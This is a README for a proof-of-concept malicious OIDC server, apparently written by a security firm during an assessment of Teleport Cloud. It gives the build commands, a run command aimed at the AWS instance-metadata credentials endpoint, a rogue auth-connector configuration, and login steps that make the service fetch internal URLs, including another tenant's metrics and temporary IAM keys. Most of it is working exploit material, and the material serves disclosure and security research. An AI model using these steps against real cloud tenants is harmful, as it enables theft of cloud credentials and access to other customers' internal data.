# oidc-ssrf

Evil OIDC server: the OpenID Configuration URL returns a 307 to cause SSRF.

## 1. Install

```
git clone --depth=1 https://github.com/doyensec/oidc-ssrf.git
cd oidc-ssrf
go get "github.com/dgrijalva/jwt-go"
go build oidc.go
```

## 2. Run the OIDC server

The OIDC server will have to run on a domain with HTTPS.

```
./oidc -listen 0.0.0.0:5999 \
       -issuer https://dscollaborator.example.com/ \
       -ssrf http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The issuer should be the publicly exposed URL of the OIDC server.

You can use an ngrok tunnel, caddy or something else to proxy the OIDC server (port 5999) over HTTPS. 
You need to be able to access the OIDC server from the issuer URL.

## 3. Add OIDC auth connector

Logged in as an admin of your tenant, go to Team > Auth Connectors > New Auth Connector > OIDC CONNECTOR.

```yaml
kind: oidc
metadata:
  name: ssrfpoc
spec:
  claims_to_roles:
  - claim: hd
    roles:
    - admin
    value: example.com
  client_id: <client id>
  client_secret: <client secret>
  display: ssrfpoc
  issuer_url: https://dscollaborator.example.com/
  redirect_url: https://doyensec--------------------bc.teleport.sh/v1/webapi/oidc/callback
  scope:
  - <scope value>
version: v2
```

Change the issuer_url (must match your domain and end in a forward slash) and redirect_url (use your tenant's cluster domain).

You should see the message `Returning nice friendly OpenID Configuration` in the OIDC server output.
Wait one minute just to make sure the config is synced (may not be strictly necessary).

## 4. Try to login

Attempt to login to the tenant web interface via the SSRFPOC method above (using private browsing or another browser). The login attempt will fail.
In the admin tab look in Activity > Audit Log. You should see a "SSO Login Failed" message:

```
SSO user login failed [
  OAuth2 error code=unsupported_response_type,
  message=failed to decode provider response "tenant-doyensec--------------------bc-role"
]
```

## 5. Try different SSRFs

The Go server can be killed and restarted with different SSRF urls such as:

*  Another tenant's prometheus: http://100.92.47.7:3000/metrics
*  Get temporary AWS keys (kiam, not host keys) http://169.254.169.254/latest/meta-data/iam/security-credentials/tenant-{mytenant}-role

You can continually attempt different SSRFs by retrying step 4.


## Credits

This PoC has been created by [Doyensec LLC](https://www.doyensec.com) for the Q1 2021 assessment of [Teleport Cloud](https://goteleport.com/teleport/cloud/). 

![alt text](https://doyensec.com/images/logo.svg "Doyensec Logo")
